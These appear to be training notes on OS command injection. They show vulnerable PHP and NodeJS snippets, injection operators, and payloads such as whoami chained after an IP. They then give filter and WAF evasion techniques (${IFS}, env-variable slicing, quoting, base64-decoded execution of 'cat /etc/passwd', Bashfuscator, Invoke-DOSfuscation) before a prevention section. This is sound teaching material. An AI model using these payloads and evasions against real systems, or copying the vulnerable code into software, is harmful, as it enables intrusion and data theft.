
# Intro to Command Injections 

## Intro to Command Injection — Minimal Technical Notes

### Command Injection Overview

- **Command Injection** allows execution of arbitrary OS commands on the back-end server.
- Considered **critical** due to potential full system and network compromise.
- Occurs when **user-controlled input** is used in system command execution without proper sanitization.

### What Are Injection Vulnerabilities

- Ranked **#3 in OWASP Top 10 Web App Risks**.
- Occur when user input is interpreted as part of executable code or queries.
- Allows attackers to **alter intended logic** of the application.

### Common Injection Types

|Injection Type|Description|
|---|---|
|OS Command Injection|User input becomes part of an OS command|
|Code Injection|User input executed as code|
|SQL Injection|User input used in SQL queries|
|XSS / HTML Injection|User input rendered directly in web pages|

- Other injection types include: LDAP, NoSQL, XPath, HTTP Header, IMAP, ORM, etc
- Root cause: **unsanitized user input in executable queries**.

### OS Command Injection

- Happens when user input directly or indirectly influences a system command.
- All major languages provide functions to execute OS commands.
- If input is not sanitized, attackers can escape command boundaries and execute arbitrary commands.

#### PHP Example (Vulnerable)

`<?php if (isset($_GET['filename'])) {     system("touch /tmp/" . $_GET['filename'] . ".pdf"); } ?>`

**Issue**

- `filename` is user-controlled.
- Passed directly to `system()` without sanitization.
- Allows command chaining and arbitrary command execution.

#### NodeJS Example (Vulnerable)

``app.get("/createfile", function(req, res){     child_process.exec(`touch /tmp/${req.query.filename}.txt`); })``

**Issue**

- `filename` from GET request used directly in command.
- No input validation or escaping.
- Vulnerable to OS command injection.

### Key Points

- Command injection is **language-agnostic**.
- Affects web apps, binaries, and thick clients alike.
- Same exploitation techniques apply across platforms.
- Any function executing OS commands with unsanitized input is a potential attack surface.

# Exploitation 

## Detection
### Detection Principle

- **Detection = Exploitation** for basic OS Command Injection.
- Inject additional commands and observe **changes in output**.
- If output deviates from normal behavior, command injection exists.
- Focus here is on **basic command injection**:
    
    - User input is directly passed to an OS command execution function
    - No sanitization or escaping is applied

### Detection Scenario

- Application provides a **Host Checker** utility.
- User supplies an IP address.
- Output resembles a `ping` command result.

**Likely back-end command**

	`ping -c 1 OUR_INPUT`

- If input is unsanitized, additional commands may be injected.

### Command Injection Detection Method

1. Provide **expected input** (e.g., IP address).
2. Append an **injection operator**.
3. Append a **new command**.
4. Observe response/output changes.

### Command Injection Operators

| Operator   | Character   | URL-Encoded | Execution Behavior               |
| ---------- | ----------- | ----------- | -------------------------------- |
| Semicolon  | `;`         | `%3b`       | Executes both commands           |
| New Line   | `\n`        | `%0a`       | Executes both commands           |
| Background | `&`         | `%26`       | Both (second often first output) |
| Pipe       | `           | `           | `%7c`                            |
| AND        | `&&`        | `%26%26`    | Second runs if first succeeds    |
| OR         | `           |             | `                                |
| Sub-shell  | `` `cmd` `` | `%60%60`    | Both (Linux only)                |
| Sub-shell  | `$(cmd)`    | `%24%28%29` | Both (Linux only)                |

### Key Notes

- Injection operators work **across languages and frameworks**.
- Applicable to:
    
    - PHP, NodeJS, .NET, etc.
    - Linux, Windows, macOS back-ends
        
- **Exception**:
    
    - `;` does **not** work in Windows CMD
    - Works in Windows PowerShell

## Injecting Commands

### Basic Injection Attempt

**Payload**

`127.0.0.1; whoami`

**Resulting Command**

`ping -c 1 127.0.0.1; whoami`

- `;` executes both commands sequentially.
- Verified locally: both `ping` output and `whoami` output are returned.

### Front-End Validation Encountered

- Web app rejects input not matching IP format.
- Error appears **without a new HTTP request**.
- Network tab shows **no request sent** → validation is client-side only.

**Conclusion**

- Input validation is enforced on the **front-end**, not the back-end.
### Bypassing Front-End Validation

**Method**

- Intercept and modify requests using a web proxy (Burp/ZAP).

**Steps**

1. Configure browser to proxy traffic.
2. Submit a valid IP (e.g. `127.0.0.1`) via UI.
3. Intercept request.
4. Send to Repeater.
5. Modify parameter to injected payload:
	 `127.0.0.1; whoami`
6. URL-encode payload.
7. Send request directly to back-end.

### Successful Injection

- Response includes:
    
    - Normal `ping` output
    - Output of injected command (`whoami`)
        
- Confirms **OS Command Injection vulnerability**.

### Key Takeaways

- Front-end validation **does not protect** against injections.
- Back-end input must be sanitized and validated.
- Command injection is confirmed when:
    - Additional command output appears in response.
- Custom HTTP requests easily bypass client-side controls.

## Other Injection Operators 

### AND Operator (`&&`)

**Behavior**

- Executes the second command **only if the first succeeds** (exit code `0`).

**Payload**

`127.0.0.1 && whoami`

**Executed Command**

`ping -c 1 127.0.0.1 && whoami`

**Result**

- Both commands execute successfully.
- Injection confirmed when both outputs appear.

**Note**

- If the first command fails, the second command will **not** run.

### OR Operator (`||`)

**Behavior**

- Executes the second command **only if the first fails** (exit code `!= 0`).

#### Case 1: First command succeeds

`ping -c 1 127.0.0.1 || whoami`

- `ping` succeeds → `whoami` not executed.
    

#### Case 2: First command fails

**Payload**

`|| whoami`

**Executed Command**

`ping -c 1 || whoami`

**Result**

- `ping` fails → `whoami` executes.
- Cleaner output (only injected command result).

**Use Case**

- Useful when injected payload breaks original command.
- Helps ensure execution of attacker command.
    
### Why Operator Choice Matters

- Different operators affect:
    
    - Execution flow
    - Output visibility
    - Reliability of injection
        
- Choosing the right operator can:
    
    - Reduce noise
    - Improve payload success
    - Bypass basic filtering

### Common Injection Operators by Type

|Injection Type|Common Operators|
|---|---|
|SQL Injection|`' ; -- /* */`|
|Command Injection|`; &&`|
|OS Command Injection|`; &|
|LDAP Injection|`* ( ) &|
|XPath Injection|`' or and not substring concat count`|
|Code Injection|`' ; -- /* */ $() ${} #{} %{} ^`|
|Directory Traversal|`../ ..\\ %00`|
|Object Injection|`; &|
|XQuery Injection|`' ; -- /* */`|
|Shellcode Injection|`\x \u %u %n`|
|Header Injection|`\n \r\n \t %0d %0a %09`|

### Key Takeaways

- `&&` → second command runs on success.
- `||` → second command runs on failure.
- OR-based payloads can give **cleaner results**.
- Injection operators are **reusable across multiple vulnerability types**.
- Operator effectiveness depends on:
    
    - OS
    - Shell
    - Application behavior


# Filter Evasion 

## Identifying Filters 
### Why Filters Exist

Applications often try to stop injections by:

- **Blacklisting characters** (`;`, `|`, `&`, etc.)
- **Blacklisting commands** (`whoami`, `ls`, `cat`, etc.)
- Using a **WAF (Web Application Firewall)**

Even with these defenses, poor implementation often makes them bypassable.
### Detecting Filter / WAF Behavior

#### Observation

- Payloads like:

	`127.0.0.1; whoami 
	`127.0.0.1 && whoami `
	`127.0.0.1 || whoami``

now return:

- `Invalid input`

#### What this tells us

- The request **reaches the backend**
- The backend **detects something malicious**
- The response is rendered inside the app UI → **likely application-level filtering**
- A full block page or IP warning would suggest a **WAF**

### Breaking Down the Payload

Original payload:

`127.0.0.1; whoami`

Components:

1. Valid IP → allowed
2. `;` → suspicious
3. Space → suspicious
4. `whoami` → suspicious command

So the block is caused by **characters, commands, or both**.

### Identifying Blacklisted Characters

#### Strategy: Binary Reduction

Remove parts of the payload until it works.
#### Step 1: Test base input

`127.0.0.1`

✅ Works

### Step 2: Add one character at a time

`127.0.0.1;`

❌ **Invalid input**

**Conclusion**

- `;` is **blacklisted**
    
## What This Means

- The filter is likely doing something like:

	`$blacklist = [';', '&', '|', ...]; if (strpos($_POST['ip'], $char) !== false) {     echo "Invalid input"; }`

- The check is:
    
    - Simple
    - Character-based
    - Not context-aware

This is **good news** from an attacker’s perspective.

### Next Logical Tests

You should now test **each operator individually**:

| Operator       | Expected Result |
| -------------- | --------------- |
| `;`            | ❌ blocked       |
| `&&`           | ❓               |
| `              |                 |
| `              | `               |
| `&`            | ❓               |
| newline `%0a`  | ❓               |
| subshell `$()` | ❓               |

This tells you:

- Which operators are filtered
- Which are still usable
- Whether encoding helps
### Key Takeaways

- “Invalid input” ≠ safe application
- Blacklists are:
    
    - Easy to fingerprint
    - Easy to bypass
    
- Always:
    
    - Reduce payloads
    - Test one character at a time
    - Compare behavior

## Bypassing Space Filters 

When applications blacklist **spaces**, attackers can still separate command arguments using alternative shell features. Below are **practical, commonly working bypasses** (Linux-focused, but some apply elsewhere).

### 1. Using a Newline as the Injection Operator

If `;`, `&&`, `||` are blocked, **newline** is often still allowed.

- Newline (URL-encoded): `%0a`

**Test**

`127.0.0.1%0a`

✅ Works → newline is **not blacklisted** and can be used as the command separator.

### 2. Identifying the Space Filter

Attempting:

`127.0.0.1%0a whoami`

❌ `Invalid input`

This confirms:

- Newline is allowed
- **Space character is blocked**

### 3. Space Bypass Techniques

#### A) Tabs Instead of Spaces

Tabs are treated as whitespace by shells.
- Tab (URL-encoded): `%09`

**Payload**

`127.0.0.1%0a%09whoami`

✅ Works  
**Why:** Shell interprets tab as a space.

#### B) Using `$IFS` (Internal Field Separator)

`$IFS` expands to a space/tab by default.

**Payload**

`127.0.0.1%0a${IFS}whoami`

✅ Works  
**Why:** Variable expansion recreates whitespace at runtime.

> Tip: `${IFS}` is safer than `$IFS` if certain characters are filtered.

#### C) Bash Brace Expansion

Brace expansion implicitly separates arguments.

**Local Example**

`{ls,-la}`

**Injection Payload**

`127.0.0.1%0a{ls,-la}`

✅ Works  
**Why:** Bash expands `{cmd,arg}` → `cmd arg` without literal spaces.

### Why These Bypasses Work

- Filters often check **raw input**, not **shell-expanded input**
- Shell features (`IFS`, tabs, braces) recreate spaces **after** filtering
- Blacklists rarely cover **all valid shell syntax**
### Key Takeaways

- Space filters are **weak defenses**
- Common bypasses:
    
    - `%09` (tab)
    - `${IFS}`
    - Brace expansion `{cmd,arg}`
        
- Combine with allowed operators (like newline `%0a`) for clean execution
- Always test **one character at a time** to fingerprint filters

## Bypassing Other Blacklisted Characters

When filters block characters like `/`, `\`, or `;`, we can **generate those characters indirectly** at runtime instead of typing them literally. Below are **reliable, real-world bypass techniques** for Linux and Windows.

### 1. Linux — Using Environment Variable Substrings

Shell variables often **contain useful characters**. We can extract **exact characters** using substring syntax:

`${VAR:offset:length}`

#### Getting a Slash `/`

The `$PATH` variable usually starts with `/`:

`${PATH:0:1}`

 **Expands to:**

`/`

Other useful variables:

- `${PWD}`
- `${HOME}`
    
#### Getting a Semicolon `;`

Some environment variables contain `;`, such as `LS_COLORS`.
Example:

`${LS_COLORS:10:1}`

Expands to:

`;`

**Use:**

`printenv`

to inspect all environment variables and find characters you need.

#### Practical Payload Example

Bypassing **semicolon + space** filters:

`127.0.0.1${LS_COLORS:10:1}${IFS}`

Expands to:

`127.0.0.1;` 

✔ Filter bypassed  
✔ Injection operator restored

### 2. Windows — CMD Environment Variable Expansion

Windows variables can also be sliced.
#### Getting a Backslash `\` (CMD)

`%HOMEPATH:~6,-11%`

Why it works:

- `%HOMEPATH%` → `\Users\htb-student`
- Slice isolates the `\`
### 3. Windows — PowerShell Character Indexing

PowerShell treats strings as arrays.
#### Getting a Backslash `\`

`$env:HOMEPATH[0]`

#### Exploring variables

`Get-ChildItem Env:`

Use indexing to extract any needed character.
### 4. Character Shifting (Linux)

When a character is blocked, you can **derive it from a nearby ASCII value**.

### Example: Producing `\`

ASCII:

- `[` = 91
- `\` = 92

Command:

`echo $(tr '!-}' '"-~'<<<[)`

✔ Outputs:

`\`

## Key Takeaways

- Blacklists are **fundamentally weak**
- Characters can be:
    
    - Extracted from environment variables
    - Generated via substring slicing
    - Reconstructed using ASCII shifts
        
- These bypasses work because:
    
    - Filtering happens **before shell expansion**
    - The shell reconstructs characters **after validation**

## Bypassing Blacklisted Commands 

**Problem**

- Applications may block **specific command words** (e.g., `whoami`, `cat`) using blacklist matching.
- Even if special characters are bypassed, execution fails once a blacklisted command appears.

**Typical Blacklist Logic**

- Exact string matching (e.g., `strpos(input, "whoami")`)
- Does **not** account for obfuscated equivalents.
### Core Bypass Idea

**Obfuscate the command so it executes the same way but does not match the blacklist string.**

### Cross-Platform (Linux & Windows)

### Quote Injection (Shell-ignored characters)

- Shells ignore quotes inside command names if balanced.

**Examples**

`w'h'o'am'i`
`w"h"o"am"i`

**Rules**

- Do not mix quote types
- Quotes must be balanced (even count

✔ Executes `whoami`  
✔ Bypasses exact-match blacklists

### Linux-Only Techniques

#### Positional Parameter Injection

`who$@ami`
### Backslash Injection

`w\ho\am\i`

- Bash ignores `$@` and `\` during command parsing
- Characters can be inserted anywhere
- No requirement for even count
### Windows-Only Techniques

#### Caret (`^`) Injection

`who^ami`

- CMD ignores `^` during execution
- Common Windows blacklist bypass
### Key Takeaways

- Blacklists rely on **literal string matching**
- Shell parsing happens **after filtering**
- Obfuscation changes appearance, not behavior
- Works across:
    
    - Command Injection
    - RCE
    - Filter-based WAF rules

## Advanced Command Obfuscation 

**Goal**  
Bypass advanced filters/WAFs that block direct command strings or simple evasion by making injected commands harder to detect while preserving execution.

### Case Manipulation

#### Windows (CMD/PowerShell)

- Commands are **case-insensitive**.

`WhOaMi`

✔ Executes `whoami`

#### Linux (bash is case-sensitive)

- Convert mixed case to lowercase at runtime.

**Using `tr`:**

`$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")`

**Constraint**

- Spaces may be filtered → replace with tabs (`%09`) or other space bypasses.

**Alternative (parameter expansion):**

`$(a="WhOaMi";printf %s "${a,,}")`

### Reversed Commands

**Idea**

- Avoid blacklisted keywords by reversing strings and reversing them back during execution.

#### Linux

`$(rev<<<'imaohw')`

#### Windows (PowerShell)

`iex "$('imaohw'[-1..-20] -join '')"`

**Note**

- If characters are filtered, reverse them as well or include them in the reversed payload.

### Encoded Commands

**Purpose**

- Avoid filtered characters or URL-decoding issues.
- Create unique payloads unlikely to match WAF signatures.

#### Linux — Base64

**Encode payload:**

`echo -n 'cat /etc/passwd | grep 33' | base64`

**Decode + execute (no pipe):**

`bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)`

- Uses `<<<` to avoid `|` (filtered).
- Alternatives if filtered:
    
    - `sh` instead of `bash`
    - `openssl` instead of `base64`
    - `xxd` for hex decoding
    
#### Windows — Base64 (UTF-16LE)

**Encode:**

`[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))`

**Decode + execute:**

`iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"`

### Key Points

- Advanced obfuscation reduces detection likelihood.
- Always adapt to:
    
    - Filtered characters
    - Blocked commands
    - Encoding/decoding constraints
    
- Techniques can be combined:
    
    - Case + reversal
    - Encoding + character bypass
        
- Many other methods exist:
    
    - Wildcards
    - Regex
    - Redirection
    - Integer expansion

## Evasion Tools 

When manual obfuscation fails against **advanced filters or WAFs**, automated evasion tools can generate payloads that are far harder to detect. Below are two commonly used tools: one for **Linux (Bash)** and one for **Windows (CMD/PowerShell)**.

### Linux: Bashfuscator

**Purpose**

- Automatically obfuscates Bash commands using multiple techniques:
    
    - Tokenization
    - String reordering
    - Variable expansion
    - Runtime reconstruction
        
- Output often does **not resemble the original command at all**.

#### Installation

`git clone https://github.com/Bashfuscator/Bashfuscator cd Bashfuscator pip3 install setuptools==65 python3 setup.py install --user`

#### Basic Usage

`cd ./bashfuscator/bin/ ./bashfuscator -c 'cat /etc/passwd'`

⚠️ Default mode is **random and heavy**:

- Payload size can be **hundreds of KBs to MBs**
- Often blocked due to length or forbidden characters


#### Controlled / Short Payload Generation

`./bashfuscator -c 'cat /etc/passwd' \   -s 1 -t 1 --no-mangling --layers 1`

**What these flags do**

- `-s 1` → one string obfuscator
- `-t 1` → one token obfuscator
- `--no-mangling` → avoids excessive transformations
- `--layers 1` → single obfuscation layer
    

✔ Produces **shorter, cleaner payloads** (≈100 chars)

#### Testing the Output

`bash -c 'OBFUSCATED_PAYLOAD'`

If it works locally but fails in a web app, common reasons are:

- Spaces not bypassed (replace with `%09`, `${IFS}`, etc.)
- Use of filtered characters (`/`, `|`, `>`, etc.)
- Payload length restrictions

 Re-run Bashfuscator with different settings until constraints are satisfied.
### Windows: Invoke-DOSfuscation

**Purpose**

- Interactive PowerShell tool for obfuscating:
    
    - CMD commands
    - PowerShell payloads
        
- Uses:
    
    - Environment variable slicing
    - Encoding tricks
    - Character reconstruction
        
#### Installation & Launch

`git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git cd Invoke-DOSfuscation Import-Module .\Invoke-DOSfuscation.psd1 Invoke-DOSfuscation`

#### Interactive Workflow Example

`Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt Invoke-DOSfuscation> encoding Invoke-DOSfuscation\Encoding> 1`

**Generated payload example**

`typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h...`

✔ Executes normally in `cmd.exe`  
✔ Does **not contain the original command string**

#### Execution Test

`C:\> typ%TEMP:~-3,-2% ...`

### Cross-Platform Tip

- You can run **Invoke-DOSfuscation on Linux** using PowerShell:
    

`pwsh`

(It’s preinstalled in **HTB Pwnbox**)

### Key Takeaways

- **Automated obfuscators** are best against:
    
    - Regex-based filters
    - Static blacklists
    - Signature-based WAF rules
        
- Always tune output for:
    
    - Length limits
    - Blocked characters
    - Allowed encodings
        
- Obfuscation ≠ exploitation
    
    - You still need a valid injection point

# Prevention 

## Command Injection Prevention

Now that we understand how command injection works **and** how filters are bypassed, prevention must focus on **secure design**, not reactive blacklists.

### 1. Avoid System Command Execution

**Best defense:**  
-  **Do not execute OS commands at all** when handling user input.
- Most languages provide **safe, built-in APIs** for common tasks.
- Example: Instead of `ping` via system calls, use socket/network APIs.

**PHP example (safe alternative):**

`fsockopen($host, 80, $errno, $errstr, 5);`

✔ No shell  
✔ No command parsing  
✔ No injection surface

**If system commands are unavoidable:**

- Never pass raw or partially trusted user input
- Minimize usage
- Combine with strict validation + sanitization

### 2. Input Validation (First Line of Defense)

Validation ensures input **matches an expected format**.

#### PHP (IP validation)

`if (filter_var($_GET['ip'], FILTER_VALIDATE_IP)) {     // safe to proceed } else {     // reject }`

#### JavaScript / NodeJS (Regex)

`if (/^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(...)\.(...)\.(...)$/.test(ip)) {     // proceed } else {     // reject }`

✔ Always validate on **backend**  
❌ Front-end validation alone is useless

### 3. Input Sanitization (Most Critical)

Sanitization removes **unnecessary special characters**, even after validation.

#### PHP (allow only IP-safe characters)

`$ip = preg_replace('/[^A-Za-z0-9.]/', '', $_GET['ip']);`

#### JavaScript

`ip = ip.replace(/[^A-Za-z0-9.]/g, '');`

#### NodeJS (DOMPurify)

`import DOMPurify from 'dompurify'; ip = DOMPurify.sanitize(ip);`

✔ Prefer **allowlists**, not blacklists  
❌ Blacklisting (`; | && whoami`) is trivial to bypass

### 4. Escaping Is Not Enough

Functions like:

- `escapeshellcmd()` (PHP)
- `escape()` (NodeJS)

⚠️ **Not sufficient alone**

- Can still be bypassed with encoding, variable expansion, or shell tricks
- Use **only as a last layer**, never as the primary defense

### 5. Secure Server Configuration (Damage Reduction)

Even with secure code, assume failure and **limit blast radius**.
#### Recommended Hardening

- **Enable WAF**
    
    - Apache `mod_security`
    - External WAFs (Cloudflare, Imperva, Fortinet)
        
- **Principle of Least Privilege**
    
    - Run web server as low-privileged user (`www-data`)
        
- **Disable dangerous functions**
    
		`disable_functions = system, exec, shell_exec, passthru`
    
- **Restrict filesystem access**
    

		 `open_basedir = /var/www/html`
    
- **Reject suspicious requests**
    
    - Double-encoded input
    - Non-ASCII URLs
        
- **Remove outdated / dangerous modules**
    
    - PHP CGI
    - Legacy extensions
    
### 6. Defense-in-Depth Mindset

✔ Secure coding  
✔ Input validation  
✔ Input sanitization  
✔ Server hardening  
✔ WAF  
✔ Regular penetration testing

**Why testing still matters**

- Large codebases = inevitable mistakes
- One unsafe call is enough for full compromise

